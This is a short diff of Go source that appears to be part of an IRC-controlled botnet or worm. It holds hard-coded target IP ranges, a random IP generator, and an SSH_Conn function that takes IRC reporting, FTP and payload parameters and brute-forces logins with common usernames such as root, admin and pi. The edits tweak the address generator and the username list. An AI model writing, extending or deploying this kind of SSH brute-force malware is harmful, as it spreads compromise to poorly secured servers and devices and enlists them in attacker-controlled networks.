@@ -50,7 +50,6 @@ const (
 	cgpn6 = "124." //124.172.0.0 - 124.175.255.255
 
 	/* For test.
-	//Private ip
 	priv = "192." //192.168.0.0 - 192.168.255.255
 
 	//Blacklist ip
@@ -70,7 +69,7 @@ func ManageIP_range(mainRange, setRange string) string {
 	ipGen = append(ipGen, setRange, ".")
 
 	for i := 0; i < 2; i++ {
-		ipGen = append(ipGen, GenRange(255, 0), ".")
+		ipGen = append(ipGen, GenRange(5, 1), ".")
 	}
 
 	ipGen[len(ipGen)-1] = ""
@@ -153,7 +152,7 @@ func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
 		You can add more if you want.
 	*/
 	userList := []string{
-		"ubuntu", "root", "user", "guest", "support", "login", "pi",
+		"admin", "root", "user", "guest", "support", "login", "pi",
 	}
 
 	passList := []string{
